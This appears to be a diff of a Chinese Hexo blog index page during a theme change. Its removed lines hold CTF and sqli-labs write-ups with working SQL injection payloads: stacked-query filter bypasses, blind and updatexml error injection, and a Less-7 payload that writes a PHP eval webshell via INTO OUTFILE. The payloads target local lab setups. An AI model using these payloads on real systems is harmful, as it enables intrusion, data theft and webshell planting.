@@ -1,2149 +1,1185 @@
+
+
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
 <head>
-  <meta charset="utf-8">
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
   
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta property="og:type" content="website">
 <meta property="og:title" content="Hexo">
 <meta property="og:url" content="http://example.com/page/9/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:locale" content="en_US">
+<meta property="og:locale" content="zh_CN">
 <meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
+<meta name="twitter:card" content="summary_large_image">
   
   
   
-<link rel="stylesheet" href="/css/style.css">
+  <title>Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/image/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
 
   
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
-
-  
-  
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
-
 <meta name="generator" content="Hexo 7.3.0"></head>
 
+
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 100vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>我的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
         
-          <a class="main-nav-link" href="/">Home</a>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
         
-          <a class="main-nav-link" href="/archives">Archives</a>
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
         
-      </nav>
-      <nav id="sub-nav">
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
         
         
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-
-      <div class="outer">
-        <section id="main">
-  
-    <article id="post-Web/注入漏洞/SQL注入/堆叠注入 stacked  injection/[强网杯 2019]随便注" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><blockquote>
-<p>先判断注入点的传参方式，发现是get传参。</p>
-</blockquote>
-<blockquote>
-<p>判断闭合方式：输入1再输入1’试试	，发现是字符型且闭合方式是单引号</p>
-</blockquote>
-<blockquote>
-<p>判断一下字符个数<code>&#39; union select 1,2;#</code>​，系统提示<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code>​</p>
-</blockquote>
-<blockquote>
-<p>&#x3D;&#x3D;select&#x3D;&#x3D;关键字无法使用，我们可以通过&#x3D;&#x3D;堆叠注入&#x3D;&#x3D;的方式，来绕过select关键字。</p>
-</blockquote>
-<blockquote>
-<p>&#x3D;&#x3D;查看数据库名：&#x3D;&#x3D;​<code>1&#39;;show databases;#</code>​</p>
-</blockquote>
-<p><img src="/.com//image-20250418170120-z5w8c3n.png" alt="image">​</p>
-<blockquote>
-<p>&#x3D;&#x3D;查看数据表：&#x3D;&#x3D;​<code>1&#39;;show tables;#</code>​</p>
-</blockquote>
-<p><img src="/.com//image-20250418170223-5ylj1zk.png" alt="image"></p>
-<blockquote>
-<p>查看表结构：</p>
-<p>方式一：<code>1&#39;; show columns from tableName;#</code>​</p>
-<p>方式二：<code>1&#39;;desc tableName;#</code>​</p>
-<p>注意，如果tableName是纯数字，需要用反引号包裹</p>
-</blockquote>
-<p><img src="/.com//image-20250418170425-ugseo8r.png" alt="image"></p>
-<blockquote>
-<p>因为select关键字被过滤了，所以我们可以通过&#x3D;&#x3D;预编译&#x3D;&#x3D;的方式&#x3D;&#x3D;拼接&#x3D;&#x3D;select 关键字：<code>1&#39;;PREPARE hacker from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from `1919810931114514` &#39;);EXECUTE  hacker;#</code>​得flag：flag{c0fc32ff-8ae1-4b96-8da0-1f621d7fdae3}  （关于预编译的讲解请见下文）</p>
-</blockquote>
-<p>‍</p>
-<p>‍</p>
-<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><blockquote>
-<p>前几步和方法一一致，最后一步（第8步），我们可以直接将<code>select * from `1919810931114514` </code>​语句进行16进制编码，即：<code>73656c656374202a2066726f6d20603139313938313039333131313435313460</code>​，替换payload：</p>
-<p>​<code>1&#39;;PREPARE hacker from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;EXECUTE  hacker;#</code>​</p>
-<p>同时，我们也可以先定义一个变量并将sql语句初始化，然后调用</p>
-<p>​<code>1&#39;;Set @jia = 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE hacker from @jia;EXECUTE hacker;#</code>​</p>
-</blockquote>
-<p>‍</p>
-<h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><blockquote>
-<p>最后一步（第8步）也可以通过修改表名和列名来实现。我们输入1后，默认会显示id为1的数据，可以猜测默认显示的是words表的数据，查看words表结构第一个字段名为<code>id</code>​我们把words表随便改成words1，然后把1919810931114514表改成words，再把列名flag改成id，就可以达到直接输出flag字段的值的效果：<code>1&#39;;  alter table words rename to words1;alter table `1919810931114514`  rename to words;alter table words change flag id varchar(50);# </code>​，然后通过<code>1&#39; or 1 = 1 #</code>​，成功获取到flag。 （关于更改表名的讲解请见下文）</p>
-</blockquote>
-<p>‍</p>
-<h2 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h2><blockquote>
-<p>此题还可以通过&#x3D;&#x3D;handle&#x3D;&#x3D;直接出答案：<code>1&#39;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</code>​</p>
-</blockquote>
-<p>‍</p>
-<p>‍</p>
-<h1 id="知识详解"><a href="#知识详解" class="headerlink" title="知识详解"></a>知识详解</h1><h2 id="1-预编译"><a href="#1-预编译" class="headerlink" title="1.预编译"></a>1.预编译</h2><p>预编译相当于定一个语句相同，参数不通的&#x3D;&#x3D;mysql&#x3D;&#x3D;模板，我们可以通过预编译的方式，绕过特定的字符过滤</p>
-<p>格式：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PREPARE 名称 FROM 	Sql语句 ? ;</span><br><span class="line">SET @x=xx;</span><br><span class="line">EXECUTE 名称 USING @x;</span><br></pre></td></tr></table></figure>
-
-<p>举例：查询ID为1的用户：</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">方法一：</span><br><span class="line">SElECT * FROM t_user WHERE USER_ID = 1</span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line">PREPARE jia FROM &#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;;</span><br><span class="line">EXECUTE jia;</span><br><span class="line"></span><br><span class="line">方法三：</span><br><span class="line">PREPARE jia FROM &#x27;SELECT * FROM t_user WHERE USER_ID = ?&#x27;;</span><br><span class="line">SET @ID = 1;</span><br><span class="line">EXECUTE jia USING @ID;</span><br><span class="line"></span><br><span class="line">方法四：</span><br><span class="line">SET @SQL=&#x27;SElECT * FROM t_user WHERE USER_ID = 1&#x27;;</span><br><span class="line">PREPARE jia FROM @SQL;</span><br><span class="line">EXECUTE jia;</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-更改表名"><a href="#2-更改表名" class="headerlink" title="2. 更改表名"></a>2. 更改表名</h2><ul>
-<li>修改表名：<code>ALTER TABLE 旧表名 RENAME TO 新表名；</code>​</li>
-<li>修改字段：<code>ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；</code>​</li>
-</ul>
-<h2 id="3-handle"><a href="#3-handle" class="headerlink" title="3.handle"></a>3.handle</h2><ul>
-<li>handle不是通用的SQL语句，是Mysql特有的，可以逐行浏览某个表中的数据，格式：</li>
-</ul>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">打开表：</span><br><span class="line">HANDLER 表名 OPEN ;</span><br><span class="line"></span><br><span class="line">查看数据：</span><br><span class="line">HANDLER 表名 READ next;</span><br><span class="line"></span><br><span class="line">关闭表：</span><br><span class="line">HANDLER 表名 READ CLOSE;</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%20stacked%20%20injection/[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8/" data-id="cmaxygi1l004hoc7kgdxw7rp9" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/注入漏洞/SQL注入/sql注入靶场/sql——labs/Less-6（布尔盲注）" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less-6%EF%BC%88%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="Less-6（布尔盲注）"><a href="#Less-6（布尔盲注）" class="headerlink" title="Less-6（布尔盲注）"></a>Less-6（布尔盲注）</h1><p>因为也是布尔盲注，所以和上一关一样</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less-6%EF%BC%88%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%89/" data-id="cmaxygi1m004ooc7kgpcvb8ww" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/注入漏洞/SQL注入/sql注入靶场/sql——labs/Less-7" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less-7/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h1><p>这一次闭合类型试判断为((‘’))</p>
-<p>这一关多了一个小tips告诉我要用到outfile</p>
-<blockquote>
-<p>我们在写入信息的时候希望多余的信息不要，那么我们就将id报错，或者说没有也就是加上负号-</p>
-</blockquote>
-<p>我们可以上传一句话木马，也可以查询版本和数据库</p>
-<p>写入一句话木马用into outfile函数</p>
-<p>‍</p>
-<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><blockquote>
-<p>​<code>http://127.0.0.1/sqli-labs/Less-7/ ?id=-1&#39;)) union select 1,2,&quot;&lt;?php @eval($_POST[&#39;a&#39;]);echo &#39;luck&#39;;?&gt;&quot; into outfile &#39;D:\\ctf_all\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\a.php&#39; --+</code>​</p>
-</blockquote>
-<p>然后用蚁剑链接即可</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less-7/" data-id="cmaxygi1n004roc7k03rg5u57" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/注入漏洞/SQL注入/sql注入靶场/sql——labs/Less-8" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less-8/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h1><h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><blockquote>
-<p>·1.<code>http://127.0.0.1/sgli/Less-8/?id=1&#39;</code>​判断此时存在注入漏洞<br>·2.<code>http://127.0.0.1/sgli/Less-8/?id=1&#39; order by 3 --+</code>​当3改为4的时候，you are in…消失，说明存在三列。<br>·3.<code>http://127.0.0.1/sali/Less-8/?id=1&#39; and left((select database()),1)=&#39;s&#39; --+</code>​猜出来当前第一位是sa<br>·或者是使用：<code>http://127.0.0.1/sqli/Less-8/?id=1&#39; and ascii(substr((select database()),1,1)) &gt; 16 --+</code>​此时是有回显的。<br>4.<code>http://127.0.0.1/sqli/Less-8/?id=1&#39; and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)）&gt; 17 --+</code>​先通过大于号或者小于号来判断数据库的第一个字母是哪一个，也可以使用<br><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-8/?id=1%27and">http://127.0.0.1/sqli/Less-8/?id=1&#39;and</a> asci(substr(selectschemaname frominformationschema.schemata limit<br>4,1)1,1)）&#x3D;115–+此时可以验证数据库中第五个数据库的第一个字母是s<br>5.<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-8/?id=1%27and">http://127.0.0.1/sqli/Less-8/?id=1&#39;and</a> asci(substr(select tablename frominformation_schema.tableswhere<br>tableschema&#x3D;0x7365637572697479limit3,1)，1,1)）&gt;11–+判断security数据库中的第4个表中的数据的第一位是否<br>大于11,也可以使用<a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-8/?id=1%E2%80%99andascisubstr">http://127.0.0.1/sqli/Less-8/?id=1’andascisubstr</a>(selecttablenamefrom<br>informationschema.tableswheretable.schema&#x3D;0x7365637572697479limit3,1),1,1))&#x3D;117–+验证数据库中第4个表<br>中的数据的第一位的第一个字母的asci码是否是117，也就是u</p>
-</blockquote>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less-8/" data-id="cmaxygi1o004soc7k0tdabw0e" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/注入漏洞/SQL注入/sql注入靶场/sql——labs/Less—5(布尔盲注)" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less%E2%80%945(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/" class="article-date">
-  <time class="dt-published" datetime="2025-05-20T00:55:54.000Z" itemprop="datePublished">2025-05-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="Less—5-布尔盲注"><a href="#Less—5-布尔盲注" class="headerlink" title="Less—5(布尔盲注)"></a>Less—5(布尔盲注)</h1><p><img src="/.com//image-20250113233740-hp9fm4b.png" alt="image"></p>
-<p>只会回显你已经进入，很明显的布尔盲注</p>
-<h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><h2 id="1-检查注入点注入类型"><a href="#1-检查注入点注入类型" class="headerlink" title="1.检查注入点注入类型"></a>1.检查注入点注入类型</h2><blockquote>
-<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-5/?id=1">http://127.0.0.1/sqli-labs/Less-5/?id=1</a>‘</p>
-</blockquote>
-<h2 id="2-检查有多少列"><a href="#2-检查有多少列" class="headerlink" title="2.检查有多少列"></a>2.检查有多少列</h2><blockquote>
-<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-5/?id=1">http://127.0.0.1/sqli-labs/Less-5/?id=1</a>‘ order by 3–+</p>
-</blockquote>
-<h2 id="3-开始猜测爆破"><a href="#3-开始猜测爆破" class="headerlink" title="3.开始猜测爆破"></a>3.开始猜测爆破</h2><blockquote>
-<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli-labs/Less-5/?id=1">http://127.0.0.1/sqli-labs/Less-5/?id=1</a>‘ and left((select database()),1)&#x3D;’s’ –+</p>
-</blockquote>
-<p>方法一：采用burpsuite一位一位字符的爆破intruder</p>
-<p>方法二：采用burpsuite转换位ascii码进行爆破，二分法,但是因为在<span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">未选择库时候用select database()转化为ascii码时它为NULL，所以是错误的</span></p>
-<blockquote>
-<p>?id&#x3D;1’ ascii(substr((select database()),1,1))&gt;156–+</p>
-<p><img src="/.com//image-20250114002516-rrufe5u.png" alt="image"></p>
-</blockquote>
-<p>方法三：直接爆库名</p>
-<h3 id="报错注入流程"><a href="#报错注入流程" class="headerlink" title="报错注入流程"></a>报错注入流程</h3><blockquote>
-<p>1、寻找注入点		2、判断字符型还是数字型		3、判断闭合方式</p>
-<p><strong>4、使用updatexml查表</strong>  ?id&#x3D;1’ and updatexml(1,concat(0x7e,database(),0x7e),3) –+  <strong>(0x7e是~，为了使我们找出来的更好的分辨展示出来)为什么要加1和3是因为updatexml函数需要三个参数</strong></p>
-<p>系统执行的语句：SELECT * FROM users WHERE id&#x3D;’1’ and updatexml(1,concat(0x7e,database(),0x7e),3) – ‘ LIMIT 0,1</p>
-<p><strong>5、使用updatexml查找表名</strong></p>
-<p>?id’&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; ‘security’),0x7e),3) –+</p>
-<p><strong>6、使用updatexmml查询列名</strong></p>
-<p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; ‘security’ and table_name &#x3D; ‘users’),3) –+</p>
-<p><strong>7、查询具体数据</strong></p>
-<p>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),3) –+   <strong>（爆不出全部，因为xpath只会报错32个字符，对于输出结果大于32个字符的命令，要用substr函数截取后分段输出）</strong></p>
-<p>?id&#x3D;1’ and updatexml(1,concat(0x7e,substr((select group_concat(username) from users),1,31),0x7e),3) –+   <strong>(substr也要三个参数，后面两个是爆的范围，group_concat和limit不能一起用)</strong></p>
-</blockquote>
-<p>‍</p>
-<p>详细解释查看布尔盲注</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E9%9D%B6%E5%9C%BA/sql%E2%80%94%E2%80%94labs/Less%E2%80%945(%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8)/" data-id="cmaxygi1p004voc7k6b8u1413" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Web/HTTP教程" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2024/05/20/Web/HTTP%E6%95%99%E7%A8%8B/" class="article-date">
-  <time class="dt-published" datetime="2024-05-19T16:00:00.000Z" itemprop="datePublished">2024-05-20</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Web/">Web</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2024/05/20/Web/HTTP%E6%95%99%E7%A8%8B/">HTTP/HTTPS 简介</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="HTTP教程"><a href="#HTTP教程" class="headerlink" title="HTTP教程"></a>HTTP教程</h1><h1 id="HTTP-HTTPS-简介"><a href="#HTTP-HTTPS-简介" class="headerlink" title="HTTP&#x2F;HTTPS 简介"></a>HTTP&#x2F;HTTPS 简介</h1><p><strong>HTTP（超文本传输协议，Hypertext Transfer Protocol）</strong> 是一种用于从网络传输超文本到本地浏览器的传输协议。它定义了客户端与服务器之间请求和响应的格式。HTTP 工作在 TCP&#x2F;IP 模型之上，通常使用端口 80。</p>
-<p><strong>HTTPS（超文本传输安全协议，Hypertext Transfer Protocol Secure）</strong> 是 HTTP 的安全版本，它在 HTTP 下增加了 SSL&#x2F;TLS 协议，提供了数据加密、完整性校验和身份验证。HTTPS 通常使用端口 443。</p>
-<h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p>HTTP 协议是 Hyper Text Transfer Protocol（超文本传输协议）的缩写，是用于从万维网（ WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。</p>
-<p>HTTP 是一个基于 TCP&#x2F;IP 通信协议来传递数据（HTML 文件、图片文件、查询结果等）。</p>
-<h3 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h3><p>HTTPS 协议是 HyperText Transfer Protocol Secure（超文本传输安全协议）的缩写，是一种通过计算机网络进行安全通信的传输协议。</p>
-<p>HTTP 本身是不安全的，因为传输的数据未经加密，可能会被窃听或篡改，为了解决这个问题，引入了 HTTPS，即在 HTTP 上加入 SSL&#x2F;TLS 协议，为数据传输提供了加密和身份验证。</p>
-<p>HTTPS 经由 HTTP 进行通信，但利用 SSL&#x2F;TLS 来加密数据包，HTTPS 开发的主要目的，是提供对网站服务器的身份认证，保护交换资料的隐私与完整性。</p>
